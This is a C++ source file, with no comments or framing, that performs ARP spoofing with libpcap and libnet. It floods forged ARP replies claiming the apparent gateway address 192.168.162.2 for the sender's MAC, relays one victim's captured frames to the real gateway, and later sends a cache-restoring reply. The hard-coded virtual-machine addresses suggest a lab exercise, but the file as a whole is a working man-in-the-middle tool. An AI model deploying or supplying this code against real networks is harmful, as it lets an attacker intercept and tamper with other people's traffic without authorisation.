#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>
#include <pcap.h>
#include <libnet.h>
#include <pthread.h>
#include <iostream>

int RECOVERY_CHECK = 1;

struct custom_arp_hdr
{
    uint16_t ar_hrd;         /* format of hardware address */
#define ARPHRD_NETROM   0   /* from KA9Q: NET/ROM pseudo */
#define ARPHRD_ETHER    1   /* Ethernet 10Mbps */
#define ARPHRD_EETHER   2   /* Experimental Ethernet */
#define ARPHRD_AX25     3   /* AX.25 Level 2 */
#define ARPHRD_PRONET   4   /* PROnet token ring */
#define ARPHRD_CHAOS    5   /* Chaosnet */
#define ARPHRD_IEEE802  6   /* IEEE 802.2 Ethernet/TR/TB */
#define ARPHRD_ARCNET   7   /* ARCnet */
#define ARPHRD_APPLETLK 8   /* APPLEtalk */
#define ARPHRD_LANSTAR  9   /* Lanstar */
#define ARPHRD_DLCI     15  /* Frame Relay DLCI */
#define ARPHRD_ATM      19  /* ATM */
#define ARPHRD_METRICOM 23  /* Metricom STRIP (new IANA id) */
#define ARPHRD_IPSEC    31  /* IPsec tunnel */
    uint16_t ar_pro;         /* format of protocol address */
    uint8_t  ar_hln;         /* length of hardware address */
    uint8_t  ar_pln;         /* length of protocol addres */
    uint16_t ar_op;          /* operation type */
#define ARPOP_REQUEST    1  /* req to resolve address */
#define ARPOP_REPLY      2  /* resp to previous request */
#define ARPOP_REVREQUEST 3  /* req protocol address given hardware */
#define ARPOP_REVREPLY   4  /* resp giving protocol address */
#define ARPOP_INVREQUEST 8  /* req to identify peer */
#define ARPOP_INVREPLY   9  /* resp identifying peer */
    /* address information allocated dynamically */
    uint8_t ar_sha[6];
    uint8_t ar_sip[4];
    uint8_t ar_tha[6];
    uint8_t ar_tip[4];
};

void *packet_handler(void *arg)
{
    char errbuf_th[PCAP_ERRBUF_SIZE];
    pcap_t *handle_th;

    handle_th = pcap_open_live("eth0", BUFSIZ, 1, 1000, errbuf_th);

    if(handle_th == NULL){
        fprintf(stderr, "%s\n", errbuf_th);

        return (void*)(2);
    }

    u_char send_buf[sizeof(libnet_ethernet_hdr) + sizeof(custom_arp_hdr) + 18] =  {0,};
    libnet_ethernet_hdr* eth_header = (libnet_ethernet_hdr*)send_buf;
    custom_arp_hdr* arp_header = (custom_arp_hdr*)(send_buf + sizeof(libnet_ethernet_hdr));

    eth_header->ether_dhost[0] = 0xff;
    eth_header->ether_dhost[1] = 0xff;
    eth_header->ether_dhost[2] = 0xff;
    eth_header->ether_dhost[3] = 0xff;
    eth_header->ether_dhost[4] = 0xff;
    eth_header->ether_dhost[5] = 0xff;

    eth_header->ether_shost[0] = 0x00;
    eth_header->ether_shost[1] = 0x0c;
    eth_header->ether_shost[2] = 0x29;
    eth_header->ether_shost[3] = 0x97;
    eth_header->ether_shost[4] = 0x9f;
    eth_header->ether_shost[5] = 0xb2;

    eth_header->ether_type = htons(ETHERTYPE_ARP);

    arp_header->ar_hrd = htons(0x0001);
    arp_header->ar_pro = htons(ETHERTYPE_IP);
    arp_header->ar_hln = 6;
    arp_header->ar_pln = 4;
    arp_header->ar_op = htons(ARPOP_REPLY);

    arp_header->ar_sha[0] = 0x00;
    arp_header->ar_sha[1] = 0x0c;
    arp_header->ar_sha[2] = 0x29;
    arp_header->ar_sha[3] = 0x97;
    arp_header->ar_sha[4] = 0x9f;
    arp_header->ar_sha[5] = 0xb2;

    arp_header->ar_sip[0] = 0xc0;
    arp_header->ar_sip[1] = 0xa8;
    arp_header->ar_sip[2] = 0xa2;
    arp_header->ar_sip[3] = 0x02;

    arp_header->ar_tha[0] = 0xff;
    arp_header->ar_tha[1] = 0xff;
    arp_header->ar_tha[2] = 0xff;
    arp_header->ar_tha[3] = 0xff;
    arp_header->ar_tha[4] = 0xff;
    arp_header->ar_tha[5] = 0xff;

    arp_header->ar_tip[0] = 0xff;
    arp_header->ar_tip[1] = 0xff;
    arp_header->ar_tip[2] = 0xff;
    arp_header->ar_tip[3] = 0xff;

    for(int i = 42; i <= 59; i++) send_buf[i] = 0x00;

    while(1){
        if(pcap_sendpacket(handle_th, (u_char*)send_buf, (sizeof(libnet_ethernet_hdr) + sizeof(custom_arp_hdr) + 18)) != 0)
            std::cout<<"Arp packet error\n";

        else{
            for(int i = 0; i < (int)(sizeof(libnet_ethernet_hdr) + sizeof(custom_arp_hdr) + 18); i++) printf("%02x ", send_buf[i]);

            std::cout<<"Arp packet send\n";
        }

        sleep(1);
    }
}

void *recovery_handler(void *arg)
{
    while(1){
        std::cin>>RECOVERY_CHECK;

        if(RECOVERY_CHECK == 0) break;
    }
}

int main()
{
    char *dev, errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle;
    pthread_t packet_threads, recovery_threads;

    dev = pcap_lookupdev(errbuf);

    if(dev == NULL){
        fprintf(stderr, "Couldn't find default device: %s\n", errbuf);

        return(2);
    }

    handle = pcap_open_live("eth0", BUFSIZ, 1, 1000, errbuf);

    if(handle == NULL){
        fprintf(stderr, "%s\n", errbuf);

        return(2);
    }

    if(pthread_create(&packet_threads, NULL, packet_handler, (void*)NULL) < 0)
        std::cout<<"Packet thread error";

    if(pthread_create(&recovery_threads, NULL, recovery_handler, (void*)NULL) < 0)
        std::cout<<"Recovery thread error";

    while(1){
        const u_char *p;
        struct pcap_pkthdr *h;
        int res = pcap_next_ex(handle, &h, &p);
        struct libnet_ethernet_hdr* eth_check = (struct libnet_ethernet_hdr*)p;

        if(res == -1) break;
        if(res == 1){
            if((eth_check->ether_shost[0] == 0x00) &&
                    ((eth_check->ether_shost[1]) == 0x0c) &&
                    ((eth_check->ether_shost[2]) == 0x29) &&
                    ((eth_check->ether_shost[3]) == 0x81) &&
                    ((eth_check->ether_shost[4]) == 0x57) &&
                    ((eth_check->ether_shost[5]) == 0x56)){
                eth_check->ether_dhost[0] = 0x00;
                eth_check->ether_dhost[1] = 0x50;
                eth_check->ether_dhost[2] = 0x56;
                eth_check->ether_dhost[3] = 0xfe;
                eth_check->ether_dhost[4] = 0x33;
                eth_check->ether_dhost[5] = 0x65;

                if(pcap_sendpacket(handle, (u_char*)p, h->len) != 0) std::cout<<"Relay error\n";

                else std::cout<<"Relay packet\n";
            }
        }

        if(RECOVERY_CHECK == 0) break;
    }

    u_char recovery_buf[sizeof(libnet_ethernet_hdr) + sizeof(custom_arp_hdr) + 18] =  {0,};
    libnet_ethernet_hdr* eth_header = (libnet_ethernet_hdr*)recovery_buf;
    custom_arp_hdr* arp_header = (custom_arp_hdr*)(recovery_buf + sizeof(libnet_ethernet_hdr));

    eth_header->ether_dhost[0] = 0x00;
    eth_header->ether_dhost[1] = 0x0c;
    eth_header->ether_dhost[2] = 0x29;
    eth_header->ether_dhost[3] = 0x81;
    eth_header->ether_dhost[4] = 0x57;
    eth_header->ether_dhost[5] = 0x56;

    eth_header->ether_shost[0] = 0x00;
    eth_header->ether_shost[1] = 0x50;
    eth_header->ether_shost[2] = 0x56;
    eth_header->ether_shost[3] = 0xfe;
    eth_header->ether_shost[4] = 0x33;
    eth_header->ether_shost[5] = 0x65;

    eth_header->ether_type = htons(ETHERTYPE_ARP);

    arp_header->ar_hrd = htons(0x0001);
    arp_header->ar_pro = htons(ETHERTYPE_IP);
    arp_header->ar_hln = 6;
    arp_header->ar_pln = 4;
    arp_header->ar_op = htons(ARPOP_REPLY);

    arp_header->ar_sha[0] = 0x00;
    arp_header->ar_sha[1] = 0x50;
    arp_header->ar_sha[2] = 0x56;
    arp_header->ar_sha[3] = 0xfe;
    arp_header->ar_sha[4] = 0x33;
    arp_header->ar_sha[5] = 0x65;

    arp_header->ar_sip[0] = 0xc0;
    arp_header->ar_sip[1] = 0xa8;
    arp_header->ar_sip[2] = 0xa2;
    arp_header->ar_sip[3] = 0x02;

    arp_header->ar_tha[0] = 0x00;
    arp_header->ar_tha[1] = 0x0c;
    arp_header->ar_tha[2] = 0x29;
    arp_header->ar_tha[3] = 0x81;
    arp_header->ar_tha[4] = 0x57;
    arp_header->ar_tha[5] = 0x56;

    arp_header->ar_tip[0] = 0xc0;
    arp_header->ar_tip[1] = 0xa8;
    arp_header->ar_tip[2] = 0xa2;
    arp_header->ar_tip[3] = 0x84;

    for(int i = 42; i <= 59; i++) recovery_buf[i] = 0x00;

    if(pcap_sendpacket(handle, (u_char*)recovery_buf, (sizeof(libnet_ethernet_hdr) + sizeof(custom_arp_hdr) + 18)) != 0)
        std::cout<<"Recovery error\n";

    else std::cout<<"Recovery arp cache\n";
}
